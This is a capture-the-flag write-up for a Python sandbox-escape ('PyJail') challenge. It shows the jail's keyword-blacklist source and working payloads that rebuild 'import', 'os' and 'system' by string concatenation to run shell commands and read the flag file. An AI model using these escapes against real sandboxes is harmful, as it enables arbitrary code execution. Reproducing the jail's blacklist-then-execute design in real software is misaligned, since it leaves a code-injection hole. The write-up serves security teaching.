PRISON BREAK Cell 1 – 300 pts
Category: PyJail
Description:

This is just a PyJail

To connect:
nc 192.168.8.136 10014

Challenge Overview
The server accepts arbitrary Python input, but blacklists certain keywords before executing the payload via os.execv. The main idea is to execute arbitrary Python code within a restricted environment, i.e., a PyJail.

python
jail.py:
import os
import sys

confiscated_tools = ['os', 'import', 'flag', 'system']

hax = input("> ")
sys.stdin.close()

if len(hax) > 1024:
    exit(1)

for tool in confiscated_tools:
    if tool in hax:
        exit(1)

code = f"""
{hax}
""".strip()

os.execv(sys.executable, [sys.executable, "-c", code])

Blacklist & Execution
Blacklisted substrings: "os", "import", "flag", "system"


The input is injected into a dynamically constructed string and executed via:

python3 -c "<user_input>"
Any input containing blacklisted substrings gets rejected. Substring matching is used (if tool in hax), not full-word matching or regex. This makes it possible for "__import__" or even "syst" + "em" to be blocked, since "import" and "system" are substrings of those.


Exploitation Strategy
To bypass the jail, I used the following strategy:

Avoid all blacklisted substrings, even when they appear within larger words.

Dynamically reconstruct banned keywords like "import", "os", and "system" using string concatenation.

Use __builtins__ as a starting point to avoid using import directly.

Working Payloads
Step 1: List the directory to confirm the flag file

(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('ls')

Output:
flag.txt
run

Step 2: Read the flag
(__builtins__.__dict__['__im'+'port__']('o'+'s').__dict__['syst'+'em'])('cat 
flag.txt')

This bypasses the jail and prints the flag: CITU{th1s_1s_jus7_4n_ez_0n3_w4rd3n_1s_c4r3l3ss}










